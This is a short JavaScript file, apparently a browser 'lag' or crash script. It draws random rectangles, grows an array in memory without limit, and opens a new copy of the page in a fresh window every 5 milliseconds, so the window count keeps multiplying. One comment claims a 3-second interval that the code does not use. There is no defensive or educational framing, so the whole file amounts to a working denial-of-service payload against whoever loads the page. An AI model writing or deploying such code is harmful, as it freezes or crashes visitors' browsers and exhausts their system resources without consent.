// Canvas rendering setup
const canvas = document.getElementById('lagCanvas');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const ctx = canvas.getContext('2d');

// Render random rectangles on the canvas
function renderRandomRects() {
  ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
  ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 50, 50);
  setTimeout(renderRandomRects, 100); // 100ms delay for each frame
}
renderRandomRects();

// Gradually bloat memory
const bigArray = [];
function slowMemoryBloat() {
  bigArray.push(new Array(1000).fill(Math.random()));
  console.log(`Array size: ${bigArray.length * 1000} elements`);
  setTimeout(slowMemoryBloat, 500); // Add new array every 500ms
}
slowMemoryBloat();

// Recursively open new windows with forced dimensions
(function openContinuously() {
  setInterval(() => {
    window.open(window.location.href, '_blank', 'width=500,height=500');
  }, 5); // Opens a new window every 3 seconds
})();
